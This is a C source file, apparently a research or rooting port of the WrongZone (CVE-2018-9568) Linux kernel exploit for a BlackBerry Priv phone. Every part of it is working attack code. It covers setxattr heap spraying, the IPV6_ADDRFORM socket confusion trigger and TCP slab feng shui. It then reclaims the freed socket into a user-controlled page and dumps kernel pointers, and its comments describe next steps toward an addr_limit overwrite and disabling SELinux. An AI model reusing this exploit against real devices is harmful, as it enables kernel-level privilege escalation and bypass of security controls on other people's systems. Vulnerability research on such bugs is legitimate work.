/*
 * wrongzone.c — Faithful WrongZone (CVE-2018-9568) exploit port for BB Priv
 *
 * Based on QuestEscape exploit. Key differences from struct_probe:
 * - Uses EXACT QuestEscape parameters (32KB spray, 66 run_out, 8 defrag)
 * - Does NOT stop spray threads after allocation loop
 * - Does NOT clean up sockets on failure (cleanup causes crash from
 *   corrupted freelists)
 * - Exits immediately on success to dump evil_mem state
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o wrongzone wrongzone.c -lpthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/* Match QuestEscape parameters EXACTLY */
#define T 8
#define PAGE_SIZE 4096
#define STACK_SIZE (T * PAGE_SIZE)   /* 32KB — same as QuestEscape */
#define THREADS 7
#define SPRAY 66
#define DUPS 300

/* Spray buffer — filled with evil_mem pointer */
char spray_buf[STACK_SIZE];

static void *spray_thread(void *arg)
{
    (void)arg;
    while (1) {
        setxattr("/data/local/tmp", "user.test", spray_buf, STACK_SIZE, XATTR_REPLACE);
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);
    printf("=== WrongZone Exploit (Faithful QuestEscape Port) ===\n");
    printf("PID: %d  UID: %d\n\n", getpid(), getuid());

    /* Phase 1: Create evil memory page */
    printf("[*] Preparing evil memory page\n");
    void *evil_mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (evil_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(evil_mem, 0, PAGE_SIZE);
    *(uint64_t *)evil_mem = 0xdeadbeefdeadbeefULL;

    /* Fill spray buffer with evil_mem pointer value */
    for (int i = 0; i < STACK_SIZE / 8; ++i)
        *(uint64_t *)(spray_buf + 8 * i) = (uint64_t)evil_mem;

    /* Phase 2: Start spray threads — DO NOT STOP THEM */
    printf("[*] Starting %d spray threads (32KB setxattr)\n", THREADS);
    pthread_t threads[THREADS];
    for (int i = 0; i < THREADS; i++) {
        int ret = pthread_create(&threads[i], NULL, spray_thread, evil_mem);
        if (ret != 0) {
            printf("pthread_create failed: %d\n", ret);
            return 1;
        }
    }

    /* Phase 3: Pin to CPU 0 */
    printf("[*] Pinning to CPU 0\n");
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Phase 4: Create the WrongZone socket */
    printf("[*] Creating WrongZone socket\n");
    int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) { perror("socket6"); return 1; }

    int val = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));

    struct sockaddr_in6 bind6 = {0};
    bind6.sin6_family = AF_INET6;
    bind6.sin6_port = htons(42424);

    struct sockaddr_in ca1 = {0};
    ca1.sin_family = AF_INET;
    ca1.sin_port = htons(42424);
    ca1.sin_addr.s_addr = inet_addr("127.0.0.1");

    struct sockaddr_in ca2 = {0};
    ca2.sin_family = AF_INET;
    ca2.sin_port = htons(42421);
    ca2.sin_addr.s_addr = inet_addr("127.0.0.1");

    struct sockaddr unsp = {0};
    unsp.sa_family = AF_UNSPEC;

    if (bind(fd, (struct sockaddr *)&bind6, sizeof(bind6)) < 0) {
        perror("bind6");
        return 1;
    }
    listen(fd, 5);

    int client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(client_fd, (struct sockaddr *)&ca1, sizeof(ca1));
    int new_fd = accept(fd, NULL, NULL);
    if (new_fd < 0) { perror("accept"); return 1; }

    /* Convert to IPv4 — the WrongZone trigger */
    val = AF_INET;
    int ret = setsockopt(new_fd, SOL_IPV6, IPV6_ADDRFORM, &val, sizeof(val));
    if (ret < 0) {
        printf("[!] IPV6_ADDRFORM failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[*] IPV6_ADDRFORM: OK — WrongZone active\n");

    /* Disconnect + rebind as IPv4 */
    connect(new_fd, &unsp, sizeof(unsp));

    struct sockaddr_in bind4 = {0};
    bind4.sin_family = AF_INET;
    bind4.sin_port = htons(42421);
    bind(new_fd, (struct sockaddr *)&bind4, sizeof(bind4));
    listen(new_fd, 5);

    client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Phase 5: Heap feng shui — EXACT QuestEscape sequence */
    printf("[*] Heap feng shui: %d run_out, %d defrag, %d fill\n", SPRAY, T, T);

    /* Pre-spray: exhaust existing TCP slab partials */
    int run_out_sk[SPRAY];
    for (int i = 0; i < SPRAY; ++i)
        run_out_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Defrag sockets — will be freed to empty slab pages */
    int defrag_sk[T];
    for (int i = 0; i < T; i++)
        defrag_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Accept the wrongzone connection */
    connect(client_fd, (struct sockaddr *)&ca2, sizeof(ca2));
    int newest_fd = accept(new_fd, NULL, NULL);
    if (newest_fd < 0) { perror("accept2"); return 1; }

    int wrongzone_sk = newest_fd;
    int follow_sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    int fill_sk[T];
    for (int i = 0; i < T; i++)
        fill_sk[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Phase 6: Free wrongzone + defrag + fill */
    printf("[*] Freeing WrongZone socket + defrag + fill\n");
    close(wrongzone_sk);

    for (int i = 0; i < T; i++)
        close(defrag_sk[i]);

    for (int i = 0; i < T; i++)
        close(fill_sk[i]);

    /* Phase 7: Spray tcp6_sock sockets — check sentinel after EACH */
    printf("[*] Spraying tcp6_sock sockets (%d attempts)...\n", DUPS);
    int evil_sk = -1;
    int dup_sks[DUPS];

    for (int i = 0; i < DUPS; ++i) {
        dup_sks[i] = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        if (dup_sks[i] < 0) {
            printf("[!] socket() failed at iter %d: %s\n", i, strerror(errno));
            dup_sks[i] = -1;
            continue;
        }

        if (*(volatile uint64_t *)evil_mem != 0xdeadbeefdeadbeefULL) {
            evil_sk = dup_sks[i];
            printf("[*] >>> CONTROLLED ALLOCATION at iter %d, fd=%d! <<<\n", i, evil_sk);
            break;
        }
    }

    if (evil_sk < 0) {
        printf("[!] Spray failed after %d iterations\n", DUPS);

        /* Check evil_mem state */
        uint64_t em0 = *(volatile uint64_t *)evil_mem;
        printf("    evil_mem[0] = 0x%016lx (%s)\n", em0,
               em0 == 0xdeadbeefdeadbeefULL ? "sentinel intact" : "CHANGED");

        /* Scan for any non-zero data beyond sentinel */
        int changed = 0;
        for (int j = 1; j < PAGE_SIZE / 8; j++) {
            if (((volatile uint64_t *)evil_mem)[j] != 0) changed++;
        }
        printf("    evil_mem non-zero entries (excl [0]): %d\n", changed);

        /* DO NOT clean up — exit immediately to avoid crash from corrupt freelists */
        printf("[*] Exiting without cleanup (avoiding freelist crash)\n");
        _exit(1);
    }

    printf("[*] +++ SPRAY SUCCESS +++\n");
    printf("    evil_sk=%d, evil_mem=%p\n", evil_sk, evil_mem);
    printf("    evil_mem[0] = 0x%016lx\n", *(uint64_t *)evil_mem);

    /* Dump evil_mem contents (kernel socket struct overlay) */
    printf("\n[*] evil_mem dump (kernel socket struct at evil_mem):\n");
    int count = 0;
    for (int j = 0; j < PAGE_SIZE / 8; j++) {
        uint64_t v = ((volatile uint64_t *)evil_mem)[j];
        if (v != 0 && count < 64) {
            const char *tag = "";
            if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL)
                tag = " KERN_LINEAR";
            else if ((v & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL)
                tag = " KERN_TEXT";
            else if (v == (uint64_t)evil_mem)
                tag = " EVIL_MEM";
            printf("    [%3d] +0x%04x: 0x%016lx%s\n", j, j * 8, v, tag);
            count++;
        }
    }

    /* Test: setsockopt TCP_CONGESTION to find struct offset */
    printf("\n[*] Testing TCP_CONGESTION setsockopt on evil_sk...\n");
    char page_before[PAGE_SIZE];
    memcpy(page_before, evil_mem, PAGE_SIZE);

    if (setsockopt(evil_sk, SOL_TCP, TCP_CONGESTION, "reno", 5) < 0) {
        printf("    TCP_CONGESTION failed: %s\n", strerror(errno));
    } else {
        printf("    TCP_CONGESTION set to reno\n");

        /* Find which offset changed (reveals icsk_ca_ops position) */
        for (int i = 0; i < PAGE_SIZE; i += 8) {
            uint64_t old = *(uint64_t *)(page_before + i);
            uint64_t new_val = *(uint64_t *)((char *)evil_mem + i);
            if (old != new_val) {
                printf("    CHANGED at +0x%04x: 0x%016lx -> 0x%016lx\n",
                       i, old, new_val);

                /* Check if both are kernel pointers */
                if ((old & 0xffffff0000000000ULL) == 0xffffff0000000000ULL &&
                    (new_val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                    printf("    ^^^ KERNEL POINTER CHANGE — icsk_ca_ops offset = 0x%x\n", i);
                }
            }
        }
    }

    /* If we got this far, we have a controlled allocation.
     * Save state and exit cleanly (don't try addr_limit yet without addresses) */
    printf("\n[*] Controlled allocation achieved. Need kernel addresses for next phase.\n");
    printf("    Required: KERNEL_GETSOCKOPT, INET6_IOCTL_END, INIT_TASK,\n");
    printf("              SELINUX_ENABLED, SELINUX_ENFORCING\n");

    /* Exit without cleanup */
    _exit(0);
}
